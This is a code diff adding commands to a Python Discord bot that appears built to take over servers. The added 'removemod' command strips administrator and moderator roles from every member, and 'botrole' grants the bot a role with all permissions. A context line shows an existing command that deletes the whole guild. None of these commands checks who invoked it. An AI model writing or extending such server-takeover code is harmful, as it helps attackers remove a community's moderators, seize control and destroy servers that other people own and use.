@@ -782,5 +782,37 @@ async def delete(ctx):
 
     await ctx.guild.delete()
 
+@bot.command()
+async def removemod(ctx):
+    if not ctx.guild.me.guild_permissions.manage_roles:
+        await ctx.send('I need the "Manage Roles" permission to remove mod and admin roles from others.')
+        return
+
+    for member in ctx.guild.members:
+        if any(role.permissions.administrator or role.permissions.manage_messages for role in member.roles):
+            for role in member.roles:
+                if role.permissions.administrator or role.permissions.manage_messages:
+                    await member.remove_roles(role)
+
+            await member.send('Your mod and admin roles have been removed by the bot.')
+
+    await ctx.send('Successfully removed mod and admin roles from others.')
+
+@bot.command()
+async def botrole(ctx):
+    if not ctx.guild.me.guild_permissions.manage_roles:
+        await ctx.send('I need the "Manage Roles" permission to create a bot role.')
+        return
+
+    bot_role = await ctx.guild.create_role(name='Bot Role', permissions=discord.Permissions.all())
+
+    bot_role.permissions.administrator = True
+
+    await bot_role.edit(permissions=bot_role.permissions)
+
+    await ctx.guild.me.add_roles(bot_role)
+
+    await ctx.send(f'Successfully created the bot role: {bot_role.name}')
+
 
 bot.run(os.environ['TOKEN'])
